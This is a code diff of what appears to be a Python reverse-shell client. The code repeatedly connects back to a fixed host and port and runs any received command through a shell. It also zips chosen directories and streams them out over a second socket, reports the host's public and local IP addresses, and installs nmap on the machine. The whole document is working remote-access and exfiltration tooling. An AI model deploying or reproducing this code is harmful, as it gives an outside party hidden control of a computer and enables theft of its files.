@@ -3,11 +3,11 @@ import time
 import subprocess
 import os
 import zipfile
-
+import requests
+import platform
 
 ip = "127.0.0.1"
 port = 8081
-
 
 def connection(ip, port):
     while True:
@@ -26,29 +26,35 @@ def listen(s):
             data = s.recv(1024)
             if not data:
                 print("[!] Connection closed by the client.")
-                break
-            if data[:-1].decode() == "/exit":
+                return False  
+
+            command = data[:-1].decode()
+            if command == "quit":
+                print("[!] Closing connection as requested by the client.")
                 s.close()
-                break
+                return False  
             else:
-                cmd(s, data[:-1].decode())
+                cmd(s, command)
+    except ConnectionResetError:
+        print("[!] The connection was closed by the remote host.")
+        return False  
     except Exception as e:
         print("Error in listen:", e)
-
+        return False
 
 def cmd(s, data):
     try:
         if data.startswith("help"):
             help_text = """\n##########
-
 Manual:
 -[execute] - to execute commands with a message returned for you;
 -[cd] - to change directory;
 -[ls or dir] - to list files;
--[ipconfig or ifconfig] - to see IP addresses.
--[Download] - Download mode for files from the server(make shure you are using the client.py file to connect on 8887 port);
--[Upload] - to upload files from your computer(make shure you are using the server.py listening on 8889 port and the same address).
-
+-[info_ip] - to see IP addresses.
+-[Download] - Download mode for files from the server;
+-[Upload] - to upload files from your computer;
+-[quit] - to exit.
+-[nmap-install] - install or use nmap
 ##########\n\n"""
             send_data(s, help_text)
 
@@ -57,7 +63,7 @@ Manual:
             output = subprocess.run(command, shell=True, capture_output=True, text=True)
             send_data(s, output.stdout)
 
-        elif data.startswith("cd"):
+        elif data.startswith("cd") or data.startswith("Cd"):
             directory = data.split(" ", 1)[1]
             os.chdir(directory)
             send_data(s, "[+] Directory changed successfully.\n")
@@ -66,110 +72,146 @@ Manual:
             server(s)
 
         elif data.startswith("Upload"):
-
             s.send(b"Enter the directory to zip> ")
-            directory_name = s.recv(1024).decode().strip()
+            directory_name = s.recv(1024).decode('utf-8').strip()
             client_path(s, directory_name)
 
-        else:        
+        elif data.startswith("info_ip"):
+            get_information_ip(s)
+        elif data.startswith("nmap-install"):
+            install_nmap(s)
+
+        else:
             output = subprocess.run(data, shell=True, capture_output=True, text=True)
             send_data(s, output.stdout)
-            if output.stdout:
-                send_data(s, output.stdout)
-            if output.stderr:
-                send_data(s, f"\n[ERROR] Command failed: {output.stderr}\n")
 
     except Exception as e:
         print("Error in cmd:", e)
-        s.send(b"\n[ERROR] Command not recognized on Terminal.\n")
+        send_data(s, "\n[!] Command not recognized.\n")
+    except ConnectionResetError:
+        print("The connection was closed by the remote host.")
 
+def get_information_ip(s):
+    try:
+        resposta = requests.get("https://ipinfo.io")
+        if resposta.status_code == 200:
+            dados_ip = resposta.json()
+            info_string = (
+                f"IP Público: {dados_ip['ip']}\n"
+                f"Cidade: {dados_ip['city']}\n"
+                f"Região: {dados_ip['region']}\n"
+                f"País: {dados_ip['country']}\n"
+                f"Provedor de Internet: {dados_ip['org']}\n"
+            )
+        else:
+            error = f"Falha na solicitação: {resposta.status_code}"
+            send_data(s, error)
+            return
+
+        local_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        local_socket.connect(("8.8.8.8", 80))  
+        ip_local = local_socket.getsockname()[0]
+        local_socket.close()
+
+        output = f"\n##########\n{info_string}IP Local: {ip_local}\n##########\n"
+        send_data(s, output)
+
+    except requests.exceptions.RequestException as req_error:
+        send_data(s, f"Erro ao obter informações do IP: {req_error}")
+    except Exception as e:
+        send_data(s, f"Erro inesperado: {e}")
+
+def install_nmap(s):
+    sistema = platform.system()
+
+    command = "where nmap" if sistema == "Windows" else "which nmap"
+    try:
+        subprocess.run(command, shell=True, check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+        send_data(s, "nmap is already installed.")
+        return
+    except subprocess.CalledProcessError:
+        pass  
+
+    if sistema == "Windows":
+        send_data(s, "[!] Installing nmap on Windows...\n")
+        subprocess.run("winget install Insecure.nmap", shell=True, check=True)
+        send_data(s, "[+] Installation completed.")
+        
+    elif sistema == "Linux":
+        send_data(s, "[!] Installing nmap on Linux...")
+        subprocess.run("apt install nmap -y", shell=True, check=True)
+        send_data(s, "[+] Installation completed.")
+    else:
+        send_data(s, "This is another platform")
 
 def send_data(s, data):
-    s.send(data.encode())
+    s.send(data.encode('utf-8'))
 
 def compactar_diretorio(diretorio, arquivo_saida):
     with zipfile.ZipFile(arquivo_saida, 'w') as zipf:
         for raiz, _, arquivos in os.walk(diretorio):
             for arquivo in arquivos:
                 caminho_completo = os.path.join(raiz, arquivo)
-                relativo = os.path.relpath(caminho_completo, diretorio)
-                zipf.write(caminho_completo, relativo)
+                zipf.write(caminho_completo, os.path.relpath(caminho_completo, diretorio))
 
 def client_path(s, directory_name):
     try:
         if not os.path.isdir(directory_name):
-            s.send(b"\n[!] Invalid directory closing client connection.\n")
+            send_data(s, "\n[!] Invalid directory closing client connection.\n")
             return
 
         client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        s.send(b"\n[!] Trying connection with the server...\n")
-
+        send_data(s, b"\n[!] Trying connection with the server...\n")
         client.connect(('127.0.0.1', 8887))
-        print('Connected [!]\n')
-        s.send(b"\n[!] Connection Received from the server.\n ")
-        time.sleep(2)
+        send_data(s, b"\n[!] Connection Received from the server.\n")
 
-
-        client.send(directory_name.encode())
-
+        client.send(directory_name.encode('utf-8'))
         with open('received_file.zip', 'wb') as file:
             while True:
                 data = client.recv(4096)
                 if not data:
                     break
-                if data:
-                    file.write(data)
-                    s.send(b'\n[+] File received as received_file.zip [ok]\n')
-                    client.close()
-                    s.send(b"\n[-] Client closed\n")
+                file.write(data)
+        send_data(s, b'\n[+] File received as received_file.zip [ok]\n')
+        client.close()
 
     except ConnectionRefusedError as e:
         print("\nConnection error: ", e)
-        exit()
     except Exception as e:
         print("\nConnection error: ", e)
-    except KeyboardInterrupt:
-        print("\nConnection closed by the client...\n")
-
 
 def clear_zip():
-    zip = "received_file.zip"
-    os.path.isfile(zip)
-    os.remove(zip)
+    zip_file = "received_file.zip"
+    if os.path.isfile(zip_file):
+        os.remove(zip_file)
 
 def server(s):
     try:
-        server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server_socket.bind(('127.0.0.1', 8889))
+        server_socket.listen(1)
 
-        server.bind(('127.0.0.1', 8889))
-        server.listen(1)
-
-        s.send(b'\n[!] Waiting for a connection...\n')
-        connection, address = server.accept()
+        send_data(s, b'\n[!] Waiting for a connection...\n')
+        connection, address = server_socket.accept()
         print(f'Connection from {address}')
 
-        s.send(b"\n[!] Connection received! \n")
-        diretorio_cliente = connection.recv(1024).decode()
+        send_data(s, b"\n[!] Connection received! \n")
+        diretorio_cliente = connection.recv(1024).decode('utf-8')
 
         if not os.path.exists(diretorio_cliente) or not os.path.isdir(diretorio_cliente):
             print(f"Directory '{diretorio_cliente}' does not exist or is not a directory.")
-            s.send(b"\n[!] Directory does not exist or is not a directory!\n")
+            send_data(s, b"\n[!] Directory does not exist or is not a directory!\n")
             connection.close()
-            server.close()
-            s.send(b"\n[-] Server closed\n")
-            
+            return
 
         arquivo_zip_saida = 'received_file.zip'
-
         compactar_diretorio(diretorio_cliente, arquivo_zip_saida)
 
         if os.path.getsize(arquivo_zip_saida) == 0:
             print(f"\nFailed to create ZIP file for directory '{diretorio_cliente}'.\n")
-            s.send(b"\n[!] Failed to create ZIP file for directory.\n")
+            send_data(s, b"\n[!] Failed to create ZIP file for directory.\n")
             connection.close()
-            server.close()
-            s.send(b"\n[-] Server closed\n")
-            exit()
+            return
 
         with open(arquivo_zip_saida, 'rb') as file:
             while True:
@@ -178,27 +220,27 @@ def server(s):
                     break
                 connection.sendall(data) 
 
-        s.send(b'\n[+] ZIP file sent.\n')
-        server.close()
-        s.send(b"\n[-] Server closed\n")
+        send_data(s, b'\n[+] ZIP file sent.\n')
         clear_zip()
     except Exception as e:
-        print("[ERROR] Failure: ",e)
-        s.send(b'[ERROR] Failure on the server.\n')
-
+        print("[ERROR] Failure: ", e)
+        send_data(s, b'[ERROR] Failure on the server.\n')
 
 def main():
     while True:
         try:
             s_connected = connection(ip, port)
             if s_connected:
-                listen(s_connected)
+                should_continue = listen(s_connected)
+                if not should_continue:
+                    print("[!] Attempting to reconnect...")
+                    time.sleep(5)  
             else:
                 print("Connection was wrong, trying again.")
+                time.sleep(5)  
         except Exception as e:
             print("Main error: ", e)
-            time.sleep(10)
-
+            time.sleep(5)
 
 if __name__ == "__main__":
     main()
